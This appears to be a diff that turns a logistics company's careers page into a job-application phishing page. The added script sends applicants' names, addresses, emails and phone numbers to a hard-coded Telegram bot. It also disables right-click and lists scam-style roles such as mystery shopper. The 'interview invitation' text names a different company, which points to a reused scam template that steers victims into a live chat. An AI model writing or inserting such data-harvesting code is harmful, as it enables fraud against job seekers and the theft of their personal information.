@@ -1,250 +1,208 @@
 <!DOCTYPE html>
 <html lang="en">
-<head> 
+<head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Wild Ewes Woolery</title>
-  <meta name="description" content="Explore career opportunities at Wild Ewes Woolery, a leading 3rd party logistics provider. Join our team of freight experts and drive the future of logistics." />
-  <meta name="keywords" content="logistics careers, freight jobs, join logistics team, warehouse jobs, dispatch careers, LTL jobs, FTL jobs, logistics hiring California" />
-  <link rel="canonical" href="https://wildeweswoolery.com/careers" />
-
-  <!-- Open Graph -->
-  <meta property="og:title" content="Careers - Wild Ewes Woolery" />
-  <meta property="og:description" content="Explore career opportunities at Wild Ewes Woolery, a leading 3rd party logistics provider. Join our team of freight experts and drive the future of logistics." />
-  <meta property="og:type" content="website" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Apply | Wild Ewes Woolery</title>
+  <meta name="description" content="Apply to Wild Ewes Woolery jobs including data entry, customer service, and logistics roles. Fast and remote-friendly application process.">
+  <meta name="keywords" content="Wild Ewes Woolery jobs, logistics careers, remote data entry, customer service openings, apply Wild Ewes">
+  <meta property="og:title" content="Apply for Jobs at Wild Ewes Woolery" />
+  <meta property="og:description" content="Explore open roles in logistics, customer support, and more. Apply today." />
   <meta property="og:url" content="https://wildeweswoolery.com/careers" />
-  <meta property="og:image" content="https://wildeweswoolery.com/image/logo.png" />
-
-  <!-- Twitter Card -->
+  <meta property="og:type" content="website" />
+  <meta property="og:image" content="https://wildeweswoolery.com/assets/logo.png" />
   <meta name="twitter:card" content="summary_large_image" />
-  <meta name="twitter:title" content="Careers - Wild Ewes Woolery" />
-  <meta name="twitter:description" content="Explore career opportunities at Wild Ewes Woolery, a leading 3rd party logistics provider. Join our team of freight experts and drive the future of logistics." />
-  <meta name="twitter:image" content="https://wildeweswoolery.com/image/logo.png" />
-
+  <link rel="canonical" href="https://wildeweswoolery.com/careers" />
   <link rel="stylesheet" href="style.css" />
-
-  <!-- Favicons -->
-  <link rel="icon" type="image/png" sizes="32x32" href="/image/favicon-32x32.png">
-  <link rel="icon" type="image/png" sizes="192x192" href="/image/android-chrome-192x192.png">
-  <link rel="apple-touch-icon" href="/image/android-chrome-192x192.png">
-  <link rel="shortcut icon" href="/image/favicon.ico" type="image/x-icon">
-  <link rel="manifest" href="/image/site.webmanifest">
-
   <style>
     body {
       font-family: Arial, sans-serif;
-      font-size: 18px;
+      background-color: #fff;
       margin: 0;
       padding: 0;
-      background-color: #696969;
-      color: white;
     }
-
     .navbar {
+      background-color: #003366;
+      color: white;
+      padding: 1rem;
       display: flex;
-      justify-content: space-between;
       align-items: center;
-      padding: 15px 20px;
-      background-color: #004080;
-      position: sticky;
-      top: 0;
-      z-index: 1000;
+      justify-content: space-between;
     }
-
-    .navbar ul {
-      list-style: none;
-      display: flex;
-      gap: 20px;
-      margin: 0;
-      padding: 0;
+    .navbar img {
+      height: 40px;
     }
-
     .navbar a {
       color: white;
+      margin-left: 20px;
       text-decoration: none;
       font-weight: bold;
     }
-
-    .logo-container {
-      display: flex;
-      align-items: center;
-      gap: 10px;
-    }
-
-    .logo-text {
-      font-weight: bold;
-    }
-
-    .logo-text span {
-      font-size: 0.8em;
-      display: block;
-    }
-
-    .logo-img {
-      height: 90px;
-      width: auto;
-    }
-
-    .cta {
-      background-color: #0077c8;
-      color: white;
-      padding: 10px 15px;
-      text-decoration: none;
-      border-radius: 5px;
-    }
-
-    .job-section {
-      padding: 30px 20px;
-      max-width: 900px;
-      margin: auto;
-    }
-
-    h1 {
-      text-align: center;
-      margin-bottom: 30px;
-    }
-
-    form {
-      background-color: #333;
-      padding: 20px;
+    .form-container {
+      max-width: 500px;
+      margin: 40px auto;
+      background-color: #f9f9f9;
+      padding: 30px;
       border-radius: 8px;
+      box-shadow: 0px 0px 10px rgba(0,0,0,0.1);
     }
-
-    label {
-      display: block;
-      margin-top: 15px;
+    .form-container h2 {
+      text-align: center;
+      color: #003366;
     }
-
-    input, select, textarea {
+    .form-container input,
+    .form-container select,
+    .form-container button {
       width: 100%;
       padding: 10px;
-      margin-top: 5px;
-      border-radius: 4px;
-      border: none;
-      font-size: 1em;
-    }
-
-    button {
-      margin-top: 20px;
-      background-color: #0077c8;
-      color: white;
-      padding: 12px 20px;
-      border: none;
+      margin-top: 15px;
+      border: 1px solid #ccc;
       border-radius: 5px;
-      font-size: 1em;
+    }
+    .form-container button {
+      background-color: #003366;
+      color: white;
       cursor: pointer;
     }
-
-    footer {
-      background-color: #000;
-      color: white;
+    .success-message {
+      display: none;
+      color: green;
       text-align: center;
-      padding: 15px;
-      font-size: 1em;
-      margin-top: 50px;
+    }
+    .interview-details,
+    .contact-page {
+      display: none;
+      padding: 30px;
+      max-width: 800px;
+      margin: 0 auto;
+    }
+    .center-me {
+      text-align: left;
+    }
+    .contact-page h2 {
+      color: #003366;
     }
   </style>
-
-  <script>
-    document.addEventListener("DOMContentLoaded", () => {
-      document.querySelectorAll('.job-title').forEach(title => {
-        title.addEventListener('click', () => {
-          title.classList.toggle('open');
-        });
-      });
-    });
-  </script>
-
-  <!-- Start of LiveChat (www.livechat.com) code -->
+  <!-- LiveChat -->
   <script>
     window.__lc = window.__lc || {};
     window.__lc.license = 16972020;
-    window.__lc.integration_name = "manual_channels";
-    window.__lc.product_name = "livechat";
-    (function(n,t,c){
-      function i(n){return e._h?e._h.apply(null,n):e._q.push(n)}
-      var e={_q:[],_h:null,_v:"2.0",
-      on:function(){i(["on",c.call(arguments)])},
-      once:function(){i(["once",c.call(arguments)])},
-      off:function(){i(["off",c.call(arguments)])},
-      get:function(){
-        if(!e._h)throw new Error("[LiveChatWidget] You can't use getters before load.");
-        return i(["get",c.call(arguments)])
-      },
-      call:function(){i(["call",c.call(arguments)])},
-      init:function(){
-        var n=t.createElement("script");
-        n.async=!0;
-        n.type="text/javascript";
-        n.src="https://cdn.livechatinc.com/tracking.js";
-        t.head.appendChild(n)
-      }};
-      !n.__lc.asyncInit&&e.init();
-      n.LiveChatWidget=n.LiveChatWidget||e
-    })(window,document,[].slice)
+    (function () {
+      var lc = document.createElement("script");
+      lc.type = "text/javascript";
+      lc.async = true;
+      lc.src = "https://cdn.livechatinc.com/tracking.js";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(lc, s);
+    })();
   </script>
-  <noscript>
-    <a href="https://www.livechat.com/chat-with/16972020/" rel="nofollow">Chat with us</a>, powered by 
-    <a href="https://www.livechat.com/?welcome" rel="noopener nofollow" target="_blank">LiveChat</a>
-  </noscript>
-  <!-- End of LiveChat code -->
 </head>
 <body>
-
-<header>
   <div class="navbar">
-    <div class="logo-container">
-      <img src="https://wildeweswoolery.com/image/logo.png" alt="Company Logo" class="logo-img">
-      <div class="logo-text">Wild Ewes Woolery<span>3rd Party Logistics</span></div>
+    <img src="https://wildeweswoolery.com/assets/logo.png" alt="Wild Ewes Woolery Logo" />
+    <div>
+      <a href="/index">Home</a>
+      <a href="/about">About</a>
+      <a href="/careers">Careers</a>
+      <a href="/contact">Contact</a>
     </div>
-    <nav>
-      <ul>
-        <li><a href="index">Home</a></li>
-        <li><a href="about">About us</a></li>
-        <li><a href="index#whyus">Why us?</a></li>
-        <li><a href="shipper">Shippers</a></li>
-        <li><a href="carriers">Carriers</a></li>
-        <li><a href="index#services">Services</a></li>
-        <li><a href="contact">Contact us</a></li>
-        <li><a href="careers">Careers</a></li>
-      </ul>
-    </nav>
-    <a class="cta" href="tel:840-242-7954">840-242-7954</a>
   </div>
-</header>
 
-<section class="job-section">
-  <h1>Apply for a Position</h1>
-  <form method="POST" action="submit_application.php" enctype="multipart/form-data">
-    <label for="fullname">Full Name:</label>
-    <input type="text" id="fullname" name="fullname" required>
+  <div class="form-container" id="apply">
+    <h2>Job Application Form</h2>
+    <form id="jobForm">
+      <input type="text" id="name" placeholder="Full Name" required>
+      <input type="text" id="address" placeholder="Mailing Address" required>
+      <input type="email" id="email" placeholder="Email" required>
+      <input type="text" id="phone" placeholder="Phone Number" required>
+      <select id="position" required>
+        <option value="">Select Position</option>
+        <option value="Data Entry Clerk">Data Entry Clerk</option>
+        <option value="Administrative Assistant">Administrative Assistant</option>
+        <option value="Customer Service Representative">Customer Service Representative</option>
+        <option value="Mail Clerk">Mail Clerk</option>
+        <option value="Executive Assistant">Executive Assistant</option>
+        <option value="Delivery Driver">Delivery Driver</option>
+        <option value="Mystery Shopper">Mystery Shopper</option>
+        <option value="Feedback Specialists">Feedback Specialists</option>
+      </select>
+      <button type="submit">Next Application</button>
+    </form>
+    <div class="success-message" id="success-message">Application Successfully Submitted!</div>
+  </div>
 
-    <label for="email">Email Address:</label>
-    <input type="email" id="email" name="email" required>
+  <div class="interview-details" id="interviewDetails">
+    <div class="center-me">
+      <h2>Interview Invitation: Discuss Your Role</h2>
+      <p>As part of our commitment to understanding each team member’s experience and ensuring the necessary support for success, we’d like to schedule a brief interview with you.</p>
+      <p>In response to the large number of applicants, we’ve moved all interviews online. This ensures an easier, faster process for candidates, who can join from their laptops or phones.</p>
+      <p><strong>During this conversation, we’ll discuss:</strong></p>
+      <ul>
+        <li>Your current role and responsibilities</li>
+        <li>Any challenges you may be facing</li>
+        <li>Ways to improve processes and team collaboration</li>
+        <li>Your feedback on how K Squared Cellars can better support you</li>
+      </ul>
+      <h3>Interview Details:</h3>
+      <ul>
+        <li>Days: Monday – Friday</li>
+        <li>Time: 8:00 AM – 6:00 PM EST</li>
+        <li>Duration: 20–30 minutes</li>
+        <li>Join via: <a href="https://direct.lc.chat/16972020" target="_blank">Live Chat Link</a></li>
+      </ul>
+      <p>You don’t need to schedule a time — just join during hours listed above. We look forward to speaking with you!</p>
+    </div>
+  </div>
 
-    <label for="position">Position Applying For:</label>
-    <select id="position" name="position">
-      <option value="Dispatcher">Dispatcher</option>
-      <option value="Logistics Coordinator">Logistics Coordinator</option>
-      <option value="Warehouse Manager">Warehouse Manager</option>
-      <option value="Driver">Driver</option>
-    </select>
+  <div class="contact-page" id="contactPage">
+    <h2>Our Offices</h2>
+    <p><strong>California</strong><br>Corporate Office<br>7975 Cameron Dr., Bldg. 1500-A, Windsor, CA 95492<br>+1 (818) 296-2990</p>
+    <p><strong>California</strong><br>Branch Office<br>780 Roosevelt STE, Irvine, CA 92620<br>+1 (800) 492-1135</p>
+    <p><strong>Mumbai (India)</strong><br>219-B, New Sonal Link Ind. Estate Off Link Rd, Opp Movie Time Cinema, Malad (W), Mumbai 400064</p>
+  </div>
 
-    <label for="resume">Upload Resume (PDF/DOC):</label>
-    <input type="file" id="resume" name="resume" accept=".pdf,.doc,.docx" required>
+  <script>
+    // Disable right-click
+    document.addEventListener('contextmenu', event => event.preventDefault());
 
-    <label for="message">Additional Message:</label>
-    <textarea id="message" name="message" rows="5"></textarea>
+    // Show Contact Page
+    function showContactPage() {
+      document.querySelector('.container').style.display = 'none';
+      document.querySelector('.form-container').style.display = 'none';
+      document.querySelector('.interview-details').style.display = 'none';
+      document.querySelector('.contact-page').style.display = 'block';
+    }
 
-    <button type="submit">Submit Application</button>
-  </form>
-</section>
+    // Form Submission
+    document.getElementById("jobForm").addEventListener("submit", function(event) {
+      event.preventDefault();
 
-<footer>
-  &copy; 2025 Wild Ewes Woolery. All rights reserved. | 
-  <a href="privacy.html" style="color: #ccc;">Privacy Policy</a> | 
-  <a href="term.html" style="color: #ccc;">Terms of Use</a>
-</footer>
+      let name = document.getElementById("name").value;
+      let address = document.getElementById("address").value;
+      let email = document.getElementById("email").value;
+      let phone = document.getElementById("phone").value;
+      let position = document.getElementById("position").value;
 
+      let message = `New Application:\nName: ${name}\nAddress: ${address}\nEmail: ${email}\nPhone: ${phone}\nPosition: ${position}`;
+
+      let telegram_bot_token = "6113839454:AAFY5WlixlzhREvqK1DAGyZBRnDeY-D9jU4";
+      let telegram_chat_id = "1461764555";
+      let telegram_url = `https://api.telegram.org/bot${telegram_bot_token}/sendMessage?chat_id=${telegram_chat_id}&text=${encodeURIComponent(message)}`;
+
+      fetch(telegram_url)
+        .then(response => response.json())
+        .then(data => {
+          if (data.ok) {
+            document.querySelector('.form-container').style.display = 'none';
+            document.getElementById("interviewDetails").style.display = 'block';
+          } else {
+            alert('Failed to submit application. Please try again.');
+          }
+        })
+        .catch(error => {
+          alert('An error occurred while submitting the application. Please try again.');
+        });
+    });
+  </script>
 </body>
 </html>
